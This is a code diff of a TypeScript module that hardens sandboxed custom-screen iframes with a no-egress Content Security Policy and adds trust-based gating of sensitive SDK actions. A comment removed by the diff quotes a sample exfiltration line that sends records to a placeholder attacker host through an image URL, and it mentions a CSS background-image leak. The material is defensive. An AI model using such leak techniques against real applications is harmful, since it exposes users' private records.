@@ -1,30 +1,38 @@
 // Shared hardening for the sandboxed custom-screen runtimes (form + app).
 
-// CSP applied INSIDE the screen's iframe. The SDK talks to the parent via postMessage (not affected by
-// CSP), so the screen needs no network of its own. The policy is deliberately NO-EGRESS: a screen can
-// read records through the FormLogic SDK, so ANY outbound request is a data-exfiltration channel.
-//   - connect-src 'none'    → blocks fetch/XHR/WebSocket/sendBeacon.
-//   - img/font/media limited to data:/blob: (local only) → blocks the classic `new Image().src =
-//     'https://attacker/?d='+records` leak AND CSS `background-image:url(https://…)` exfil. NO remote
-//     https: hosts — custom screens must inline/data-URI any imagery; there are no remote webfonts.
-//   - default-src 'none'    → blocks plugins/objects/prefetch/etc.
-//   - base-uri/form-action 'none' → prevents <base> and form-submission hijacking.
-//   - object-src/worker-src/frame-src 'none' → blocks <object>/<embed>, Worker(), and nested iframes
-//     (each of which could otherwise issue an outbound request).
-//   - navigate-to 'none'    → blocks the frame self-navigating to a remote URL (`location.href='https…'`)
-//     as an exfil channel. The sandbox already blocks popups (no allow-popups) and top-navigation (no
-//     allow-top-navigation); navigate-to closes SELF-navigation. NOTE: navigate-to is not yet shipped
-//     in Chrome/Safari, so for those engines this is best-effort — which is why custom CODE screens are
-//     treated as TRUSTED content (official packs / your own code) and imported/community code screens
-//     get an explicit trust warning on install. Prefer no-code widget dashboards (host-rendered, no
-//     iframe, zero egress surface). See docs/CUSTOM_SCREEN_DASHBOARD_KIT.md.
-// If you ever need real assets in a screen, add a controlled FormLogic asset mechanism — never widen
-// this to `https:`.
+// CSP applied inside the opaque-origin iframe. It remains useful defense in
+// depth, but self-navigation is deliberately not a security invariant because
+// supported browsers do not consistently implement a navigation directive.
+// Sensitive SDK methods are instead denied by server-derived provenance for
+// every unverified imported screen.
+//
+// The iframe needs no network of its own: SDK calls use postMessage. Remote
+// fetch/XHR/WebSocket, images, media, fonts, forms, objects, workers and nested
+// frames are all blocked. If screens need remote assets, add a controlled
+// FormLogic asset capability rather than widening this policy to https:.
 export const SCREEN_CSP =
   "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
   + "img-src data: blob:; font-src data:; media-src data: blob:; "
   + "connect-src 'none'; base-uri 'none'; form-action 'none'; "
   + "navigate-to 'none'; frame-src 'none'; object-src 'none'; worker-src 'none'";
+
+export type ScreenTrust = 'owner' | 'verified' | 'untrusted' | undefined;
+
+const TRUSTED_ONLY_ACTIONS = new Set([
+  'submit',
+  'records',
+  'currentUser',
+  'record',
+  'related',
+  'navigate',
+  'openForm',
+  'openRecords',
+]);
+
+/** Imported community code remains visual-only even if its iframe executes. */
+export function isScreenSdkActionAllowed(trust: ScreenTrust, action: string): boolean {
+  return trust === 'owner' || trust === 'verified' || !TRUSTED_ONLY_ACTIONS.has(action);
+}
 
 /**
  * Per-runtime SDK rate limiter. The iframe can loop arbitrarily; even though it can't reach the network
